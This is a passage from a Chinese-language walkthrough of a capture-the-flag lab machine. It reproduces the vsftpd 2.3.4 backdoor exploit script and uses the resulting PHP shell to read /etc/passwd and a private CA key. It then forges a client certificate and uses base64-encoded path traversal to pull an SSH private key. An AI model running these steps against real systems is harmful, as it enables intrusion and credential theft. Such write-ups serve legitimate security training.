OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T= OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S OS:) Network Distance: 2 hops Service Info: OS: Unix TRACEROUTE (using port 110/tcp) HOP RTT ADDRESS 1 386.92 ms 10.10.16.1 2 632.59 ms 10.10.10.131 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 86.65 seconds Http 首页面没什么可以点的，GET FREE TRIAL 点了无效，做一下信息收集看看把 使用 https 访问，会提示需要提供客户端证书才可以使用 这里扫目录也没扫出其他东西，我们去看看其他思路 漏洞利用Ftp目前 ftp 使用的版本是 vsftpd 2.3.4 ，我印象中是有漏洞的，去搜索一下 ┌──(root㉿kali)-[~/Desktop] └─# searchsploit vsftpd 2.3.4 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 确实是有一个漏洞，一个后门命令执行，使用上面那个脚本没成功，去尝试一下 msf 吧 msf6 &gt; search vsftpd 2.3.4 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor msf6 &gt; use 0 [*] No payload configured, defaulting to cmd/unix/interact msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options Module options (exploit/unix/ftp/vsftpd_234_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 21 yes The target port (TCP) Payload options (cmd/unix/interact): Name Current Setting Required Description ---- --------------- -------- ----------- Exploit target: Id Name -- ---- 0 Automatic View the full module info with the info, or info -d command. 我们填写上域名，然后直接运行 msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 10.10.10.131 rhosts =&gt; 10.10.10.131 msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 10.10.10.131:21 - The port used by the backdoor bind listener is already open [-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell [*] Exploit completed, but no session was created. 这里似乎提示在 6200 端口，但是我尝试了一下 6200 端口也是无法利用的，在 nmap 的时候 6200 端口也是 filtered 状态的，去尝试直接连接试试 ┌──(root㉿kali)-[~/Desktop] └─# nc 10.10.10.131 6200 Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman help help Show a list of commands. Type `help [foo]` for information about [foo]. Aliases: ? ls List local, instance or class variables, methods and constants. Aliases: list, dir dump Dump an object or primitive. doc Read the documentation for an object, class, constant, method or property. Aliases: rtfm, man show Show the code for an object, class, constant, method or property. wtf Show the backtrace of the most recent exception. Aliases: last-exception, wtf? whereami Show where you are in the code. throw-up Throw an exception or error out of the Psy Shell. timeit Profiles with a timer. trace Show the current call stack. buffer Show (or clear) the contents of the code input buffer. Aliases: buf clear Clear the Psy Shell screen. edit Open an external editor. Afterwards, get produced code in input buffer. sudo Evaluate PHP code, bypassing visibility restrictions. history Show the Psy Shell history. Aliases: hist exit End the current session and return to caller. Aliases: quit, q 似乎是一个 shell 这里我有点感兴趣，去再次扫描一下这个端口试试 ┌──(root㉿kali)-[~/Desktop] └─# nmap -vvv -p6200 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:39 CST Initiating Ping Scan at 04:39 Scanning 10.10.10.131 [4 ports] Completed Ping Scan at 04:39, 0.43s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 04:39 Completed Parallel DNS resolution of 1 host. at 04:39, 0.01s elapsed DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 04:39 Scanning 10.10.10.131 [1 port] Discovered open port 6200/tcp on 10.10.10.131 Completed SYN Stealth Scan at 04:39, 0.45s elapsed (1 total ports) Nmap scan report for 10.10.10.131 Host is up, received syn-ack ttl 63 (0.39s latency). Scanned at 2023-01-09 04:39:23 CST for 1s PORT STATE SERVICE REASON 6200/tcp open lm-x syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds Raw packets sent: 5 (196B) | Rcvd: 5 (196B) 再次扫描显示的却是 open，那证明之前的脚本对这台服务器做了什么，去把机器还原一下，然后再去看看漏洞详情 # Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution # Date: 9-04-2021 # Exploit Author: HerculesRD # Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html # Version: vsftpd 2.3.4 # Tested on: debian # CVE : CVE-2011-2523 #!/usr/bin/python3 from telnetlib import Telnet import argparse from signal import signal, SIGINT from sys import exit def handler(signal_received, frame): # Handle any cleanup here print(&#39; [+]Exiting...&#39;) exit(0) signal(SIGINT, handler) parser=argparse.ArgumentParser() parser.add_argument(&quot;host&quot;, help=&quot;input the address of the vulnerable host&quot;, type=str) args = parser.parse_args() host = args.host portFTP = 21 #if necessary edit this line user=&quot;USER nergal:)&quot; password=&quot;PASS pass&quot; tn=Telnet(host, portFTP) tn.read_until(b&quot;(vsFTPd 2.3.4)&quot;) #if necessary, edit this line tn.write(user.encode(&#39;ascii&#39;) + b&quot;\\n&quot;) tn.read_until(b&quot;password.&quot;) #if necessary, edit this line tn.write(password.encode(&#39;ascii&#39;) + b&quot;\\n&quot;) tn2=Telnet(host, 6200) print(&#39;Success, shell opened&#39;) print(&#39;Send `exit` to quit shell&#39;) tn2.interact() 这里是对 21 端口进行了登录，但是账号却是“:)”这么一个笑脸？等恢复好以后去尝试手动利用呢 ┌──(root㉿kali)-[~/Desktop] └─# nc 10.10.10.131 6200 (UNKNOWN) [10.10.10.131] 6200 (?) : Connection refused 直接请求确实是不行的，所以一开始的扫描结果应该是正确的 ┌──(root㉿kali)-[~/Desktop] └─# ftp 10.10.10.131 Connected to 10.10.10.131. 220 (vsFTPd 2.3.4) Name (10.10.10.131:root): lucifiel:) 331 Please specify the password. Password: 421 Service not available, remote server timed out. Connection closed. ftp: Login failed 然后我们随便使用一个账号登录 ftp，将结果添加上 :) 笑脸就可以了 ┌──(root㉿kali)-[~/Desktop] └─# nmap -vvv -p6200 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:44 CST Initiating Ping Scan at 04:44 Scanning 10.10.10.131 [4 ports] Completed Ping Scan at 04:44, 0.42s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 04:44 Completed Parallel DNS resolution of 1 host. at 04:44, 0.01s elapsed DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 04:44 Scanning 10.10.10.131 [1 port] Discovered open port 6200/tcp on 10.10.10.131 Completed SYN Stealth Scan at 04:44, 0.44s elapsed (1 total ports) Nmap scan report for 10.10.10.131 Host is up, received echo-reply ttl 63 (0.39s latency). Scanned at 2023-01-09 04:44:06 CST for 0s PORT STATE SERVICE REASON 6200/tcp open lm-x syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.97 seconds Raw packets sent: 5 (196B) | Rcvd: 5 (196B) 然后再扫描就是显示 open ┌──(root㉿kali)-[~/Desktop] └─# nc 10.10.10.131 6200 Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman 然后再连接就显示给了我们一个 php shell https://stackoverflow.com/questions/56910401/how-to-execute-system-commands-using-psysh-php 这里找到一篇参考文章，显示如果我们要使用这个 php shell 执行系统命令，那么我们可以使用反引号 ` 来将要执行的指令给包起来，我们去尝试执行一下 `whoami` PHP Warning: shell_exec() has been disabled for security reasons in phar://eval()&#39;d code on line 1 这里提示错误，但是知道了执行我们命令的函数是 shell_exec() 如果我们尝试自己构造命令呢？ echo(&quot;I&#39;m Lucifiel!&quot;) I&#39;m Lucifiel!⏎ system(&quot;whoami&quot;) PHP Fatal error: Call to undefined function system() in Psy Shell code on line 1 system(&quot;id&quot;) PHP Fatal error: Call to undefined function system() in Psy Shell code on line 1 echo 被成功输出了，但是 shell 的似乎没有输出？所以我们需要尝试一下哪些函数可以被执行 phphpinfo() phpinfo() PHP Version =&gt; 7.2.10 System =&gt; Linux lacasadepapel 4.14.78-0-virt #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64 Build Date =&gt; Sep 17 2018 09:23:43 phpinfo 可以被执行，也可以显示很多重要的信息，但是由于内容太多我就不全部贴上来了 disable_functions =&gt; exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source =&gt; exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source 我们这里可以看到，刚才尝试的部分函数已经被 php 禁用了 去翻一下 php 函数吧，复习复习基本功 https://www.runoob.com/php/php-ref-directory.html 还真找到一个，scandir() 函数，返回指定目录中的文件和目录的数组。 scandir(&quot;.&quot;) =&gt; [ &quot;.&quot;, &quot;..&quot;, &quot;.DS_Store&quot;, &quot;._.DS_Store&quot;, &quot;bin&quot;, &quot;boot&quot;, &quot;dev&quot;, &quot;etc&quot;, &quot;home&quot;, &quot;lib&quot;, &quot;lost+found&quot;, &quot;media&quot;, &quot;mnt&quot;, &quot;opt&quot;, &quot;proc&quot;, &quot;root&quot;, &quot;run&quot;, &quot;sbin&quot;, &quot;srv&quot;, &quot;swap&quot;, &quot;sys&quot;, &quot;tmp&quot;, &quot;usr&quot;, &quot;var&quot;, ] 当前我们在根目录，而且 mac 用户看到 .DS_Store 应该能想到，这台是和 mac 进行过连接的 scandir(&quot;/home/&quot;) =&gt; [ &quot;.&quot;, &quot;..&quot;, &quot;berlin&quot;, &quot;dali&quot;, &quot;nairobi&quot;, &quot;oslo&quot;, &quot;professor&quot;, ] 这里可以看到是有五个用户的 file_get_contents(&quot;/etc/passwd&quot;) =&gt; &quot;&quot;&quot; root:x:0:0:root:/root:/bin/ash\\n bin:x:1:1:bin:/bin:/sbin/nologin\\n daemon:x:2:2:daemon:/sbin:/sbin/nologin\\n adm:x:3:4:adm:/var/adm:/sbin/nologin\\n lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\\n sync:x:5:0:sync:/sbin:/bin/sync\\n shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\\n halt:x:7:0:halt:/sbin:/sbin/halt\\n mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\\n news:x:9:13:news:/usr/lib/news:/sbin/nologin\\n uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\\n operator:x:11:0:operator:/root:/bin/sh\\n man:x:13:15:man:/usr/man:/sbin/nologin\\n postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\\n cron:x:16:16:cron:/var/spool/cron:/sbin/nologin\\n ftp:x:21:21::/var/lib/ftp:/sbin/nologin\\n sshd:x:22:22:sshd:/dev/null:/sbin/nologin\\n at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\\n squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\\n xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\\n games:x:35:35:games:/usr/games:/sbin/nologin\\n postgres:x:70:70::/var/lib/postgresql:/bin/sh\\n cyrus:x:85:12::/usr/cyrus:/sbin/nologin\\n vpopmail:x:89:89::/var/vpopmail:/sbin/nologin\\n ntp:x:123:123:NTP:/var/empty:/sbin/nologin\\n smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\\n guest:x:405:100:guest:/dev/null:/sbin/nologin\\n nobody:x:65534:65534:nobody:/:/sbin/nologin\\n chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin\\n dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh\\n berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash\\n professor:x:1002:1002:professor,,,:/home/professor:/bin/ash\\n vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin\\n memcached:x:102:102:memcached:/home/memcached:/sbin/nologin\\n &quot;&quot;&quot; 可以确定这几个用户不是都有 bash 权限的，我们去看看有没有权限获得某个的 ssh 密钥吧 scandir(&quot;/home/dali/.ssh&quot;) =&gt; [ &quot;.&quot;, &quot;..&quot;, &quot;authorized_keys&quot;, &quot;known_hosts&quot;, ] 经过测试，只有 dali 的目录咱们有权限 file_get_contents(&quot;/home/nairobi/ca.key&quot;) =&gt; &quot;&quot;&quot; -----BEGIN PRIVATE KEY-----\\n MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n 7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n 2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\\n uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\\n YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\\n s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\\n PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\\n Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\\n 1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\\n /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\\n q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\\n uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\\n I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\\n 7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\\n G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\\n sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\\n CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\\n sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\\n ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\\n zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\\n ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\\n 9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\\n WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\\n 7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\\n aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\\n 53udBEzjt3WPqYGkkDknVhjD\\n -----END PRIVATE KEY-----\\n &quot;&quot;&quot; 我们在 nairobi 用户下发现了一个 ca.key 文件，里面有一段证书？还是密钥？说不好 -----BEGIN PRIVATE KEY-----\\n MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n 7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n 2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\\n uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\\n YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\\n s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\\n PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\\n Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\\n 1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\\n /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\\n q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\\n uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\\n I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\\n 7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\\n G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\\n sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\\n CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\\n sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\\n ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\\n zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\\n ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\\n 9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\\n WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\\n 7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\\n aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\\n 53udBEzjt3WPqYGkkDknVhjD\\n -----END PRIVATE KEY-----\\n 这样直接保存下来，格式真是相当的乱啊，稍微替换整理一下 在 vim 中使用 :%s/\\\\n//g/ 和 :%s/ //g就行替换 得到了干净密钥 -----BEGINPRIVATEKEY----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb 7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/ 2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89 1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+ q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og 7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2 zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/ ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC 9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM 7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc 53udBEzjt3WPqYGkkDknVhjD -----ENDPRIVATEKEY----- 但是空格被我们删除完了，所以我们还需要修改一下 -----BEGIN PRIVATE KEY----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb 7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/ 2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89 1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+ q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og 7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2 zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/ ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC 9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM 7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc 53udBEzjt3WPqYGkkDknVhjD -----END PRIVATE KEY----- ok，这样才是一个完整正确的密钥 然后我们去生成一个证书 openssl req -new -key ca.key -out server.csr openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12 内容可以随便填 ┌──(root㉿kali)-[~/Desktop] └─# openssl req -new -key ca.key -out server.csr You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter &#39;.&#39;, the field will be left blank. ----- Country Name (2 letter code) [AU]: State or Province Name (full name) [Some-State]: Locality Name (eg, city) []: Organization Name (eg, company) [Internet Widgits Pty Ltd]: Organizational Unit Name (eg, section) []: Common Name (e.g. server FQDN or YOUR name) []: Email Address []: Please enter the following &#39;extra&#39; attributes to be sent with your certificate request A challenge password []: An optional company name []: ┌──(root㉿kali)-[~/Desktop] └─# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt Certificate request self-signature ok subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd ┌──(root㉿kali)-[~/Desktop] └─# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12 Enter Export Password: Verifying - Enter Export Password: ok，这样我们就生成了我们需要的证书 然后我们去浏览器导入我们的 p12 证书 ok，成功导入后我们就可以访问了 鼠标放上去就可以看到左下角出现了 https://10.10.10.131/?path=SEASON-1 这很明显有 lfi 了吧 成功包含到目录，我们去尝试一下获取 ssh 的密钥 但是直接获取会出错，我们去看一下他的文件格式是怎样的 似乎是转换为 base64 的 ┌──(root㉿kali)-[~/Desktop] └─# echo U0VBU09OLTEvMDEuYXZp|base64 -d SEASON-1/01.avi 是的，是 base64，那我们也把需要读取的文件名转换为 base64 就好了 ┌──(root㉿kali)-[~/Desktop] └─# echo -n ../.ssh/id_rsa|base64 Li4vLnNzaC9pZF9yc2E= 然后再去读取 https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E= -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn NhAAAAAwEAAQAAAgEAotH6Ygupi7JhjdbDXhg2f9xmzxaDNdxxEioAgH2GjUeUc4cJeTfU /yWg1vyx1dXqanfwAzYOQLUgO9/rDbI9y51rTQnLhHsp/iFiGdvDO5iZwLNrwmzVLxgGc+ mNac3qxHcuHx7q+zQHB8NfU/qzyAL2/xsRkzBODRg21tsVqnTV83T8CFSBUO2jzitHFNjv YbacP+Jn9Q5Y2HRdE03DWnAJJ7zk4SWWicM3riuuYyeqV6OYKboHwi+FB94Yx1xaPFGP7T 0jnBU3molURhKKolNqY78PE5qYplO/eO5H/7vKbrF7J5VtsVpvGQsmjqUhQK/GoYrMudIh cfQSMUnpgWXYtCnIpBa53aY/fl0XYpL9a1ZQh1iGm4oleVnZNvqMa4mb+8kC8k3WDmw9pq 